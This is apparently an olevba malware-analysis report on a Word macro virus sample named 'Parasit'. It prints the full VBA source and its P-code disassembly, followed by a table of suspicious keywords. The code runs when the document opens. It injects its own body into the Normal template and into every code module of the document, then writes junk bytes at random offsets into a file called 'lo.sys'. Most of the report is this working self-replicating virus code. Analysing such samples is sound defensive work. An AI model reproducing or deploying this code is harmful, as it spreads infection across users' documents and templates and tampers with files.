olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Parasit
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Parasit - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
GoSub Flesh:
'macro code of user
'macro code of user
'macro code of user
'macro code of user
'THIS IS THE ORIGINAL VERSION OF THE PARASIT VIRUS OF LORD Arz
'let's have fun...
Flesh:
If Hook = 1 Then Exit Sub
Owner = ThisDocument.Name
If UCase(Owner) = "NORMAL.DOT" Then Ways = 1 Else Ways = 0
Select Case Ways
Case 0
    
    For c = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(c).CodeModule.Lines(2, 1) = "GoSub Flesh:" Then Set Carrier = ActiveDocument.VBProject.VBComponents(c).CodeModule
    Next c
    For i = 1 To Carrier.CountOfLines
        If Carrier.Lines(i, 1) = "Flesh:" Then
            For x = i To Carrier.CountOfLines - 1
                VC = VC & Carrier.Lines(x, 1) & Chr(13)
            Next x
            VC = Left(VC, Len(VC) - 1)
        i = x
        End If
    Next i
    
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        Set ToOwn = NormalTemplate.VBProject.VBComponents(i).CodeModule
        If ToOwn.CountOfLines <= 1 Then ToOwn.InsertLines 1, "Sub AutoOpen()" & Chr(13) & "'" & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(13) & "End Sub"
        If ToOwn.Lines(2, 1) = "GoSub Flesh:" Then GoTo FAllDoneP
        For x = 1 To ToOwn.CountOfLines + 1
            If Left(ToOwn.Lines(x, 1), 3) = "Sub" Or Left(ToOwn.Lines(x, 1), 10) = "Private Sub" Then ToOwn.InsertLines x + 1, "Gosub Flesh:"
            If Left(ToOwn.Lines(x, 1), 7) = "End Sub" Then ToOwn.InsertLines x, VC
        Next x
FAllDoneP:
    Next i
GoTo DeadFlesh
Case 1
    
    For c = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(c).CodeModule.Lines(2, 1) = "GoSub Flesh:" Then Set Carrier = ActiveDocument.VBProject.VBComponents(c).CodeModule
    Next c
    For i = 1 To Carrier.CountOfLines
        If Carrier.Lines(i, 1) = "Flesh:" Then
            For x = i To Carrier.CountOfLines - 1
                VC = VC & Carrier.Lines(x, 1) & Chr(13)
            Next x
            VC = Left(VC, Len(VC) - 1)
        i = x
        End If
    Next i
    
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        Set ToOwn = ActiveDocument.VBProject.VBComponents(i).CodeModule
        If ToOwn.CountOfLines <= 1 Then ToOwn.InsertLines 1, "Sub AutoOpen()" & Chr(13) & "'" & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(13) & "End Sub"
        If ToOwn.Lines(2, 1) = "GoSub Flesh:" Then GoTo PAllDoneF
        For x = 1 To ToOwn.CountOfLines + 1
            If Left(ToOwn.Lines(x, 1), 3) = "Sub" Or Left(ToOwn.Lines(x, 1), 10) = "Private Sub" Then ToOwn.InsertLines x + 1, "Gosub Flesh:"
            If Left(ToOwn.Lines(x, 1), 7) = "End Sub" Then ToOwn.InsertLines x, VC
        Next x
PAllDoneF:
    Next i
End Select
DeadFlesh:
EatUp = Int(Rnd * 50000000) + 10000000
Theef = Int(Rnd * 255)
Open "lo.sys" For Binary As #1
Put #1, EatUp, Theef
Close #1
Hook = 1
Return
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Parasit
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15245 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	GoSub Flesh 
' 	BoS 0x0000 
' Line #2:
' 	QuoteRem 0x0000 0x0012 "macro code of user"
' Line #3:
' 	QuoteRem 0x0000 0x0012 "macro code of user"
' Line #4:
' 	QuoteRem 0x0000 0x0012 "macro code of user"
' Line #5:
' 	QuoteRem 0x0000 0x0012 "macro code of user"
' Line #6:
' 	QuoteRem 0x0000 0x003D "THIS IS THE ORIGINAL VERSION OF THE PARASIT VIRUS OF LORD Arz"
' Line #7:
' 	QuoteRem 0x0000 0x0011 "let's have fun..."
' Line #8:
' 	Label Flesh 
' Line #9:
' 	Ld Hook 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #10:
' 	Ld ThisDocument 
' 	MemLd New 
' 	St Owner 
' Line #11:
' 	Ld Owner 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "NORMAL.DOT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Ways 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Ways 
' 	EndIf 
' Line #12:
' 	Ld Ways 
' 	SelectCase 
' Line #13:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #14:
' Line #15:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #16:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "GoSub Flesh:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld c 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Carrier 
' 	EndIf 
' Line #17:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Carrier 
' 	MemLd CountOfLines 
' 	For 
' Line #19:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Carrier 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "Flesh:"
' 	Eq 
' 	IfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld i 
' 	Ld Carrier 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #21:
' 	Ld VC 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld Carrier 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VC 
' Line #22:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	Ld VC 
' 	Ld VC 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St VC 
' Line #24:
' 	Ld x 
' 	St i 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #27:
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #29:
' 	SetStmt 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ToOwn 
' Line #30:
' 	Ld ToOwn 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld ToOwn 
' 	ArgsMemCall InsertLines 0x0002 
' 	EndIf 
' Line #31:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "GoSub Flesh:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo FAllDoneP 
' 	EndIf 
' Line #32:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #33:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Eq 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000A 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000B "Private Sub"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000C "Gosub Flesh:"
' 	Ld ToOwn 
' 	ArgsMemCall InsertLines 0x0002 
' 	EndIf 
' Line #34:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld x 
' 	Ld VC 
' 	Ld ToOwn 
' 	ArgsMemCall InsertLines 0x0002 
' 	EndIf 
' Line #35:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #36:
' 	Label FAllDoneP 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	GoTo DeadFlesh 
' Line #39:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #40:
' Line #41:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld c 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "GoSub Flesh:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld c 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set Carrier 
' 	EndIf 
' Line #43:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Carrier 
' 	MemLd CountOfLines 
' 	For 
' Line #45:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Carrier 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0006 "Flesh:"
' 	Eq 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld i 
' 	Ld Carrier 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #47:
' 	Ld VC 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld Carrier 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St VC 
' Line #48:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	Ld VC 
' 	Ld VC 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St VC 
' Line #50:
' 	Ld x 
' 	St i 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' Line #54:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #55:
' 	SetStmt 
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ToOwn 
' Line #56:
' 	Ld ToOwn 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld ToOwn 
' 	ArgsMemCall InsertLines 0x0002 
' 	EndIf 
' Line #57:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "GoSub Flesh:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo PAllDoneF 
' 	EndIf 
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #59:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Eq 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000A 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000B "Private Sub"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x000C "Gosub Flesh:"
' 	Ld ToOwn 
' 	ArgsMemCall InsertLines 0x0002 
' 	EndIf 
' Line #60:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Ld ToOwn 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld x 
' 	Ld VC 
' 	Ld ToOwn 
' 	ArgsMemCall InsertLines 0x0002 
' 	EndIf 
' Line #61:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	Label PAllDoneF 
' Line #63:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	EndSelect 
' Line #65:
' 	Label DeadFlesh 
' Line #66:
' 	Ld Rnd 
' 	LitDI4 0xF080 0x02FA 
' 	Mul 
' 	FnInt 
' 	LitDI4 0x9680 0x0098 
' 	Add 
' 	St EatUp 
' Line #67:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	St Theef 
' Line #68:
' 	LitStr 0x0006 "lo.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Ld EatUp 
' 	Ld Theef 
' 	PutRec 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #71:
' 	LitDI2 0x0001 
' 	St Hook 
' Line #72:
' 	Return 
' Line #73:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

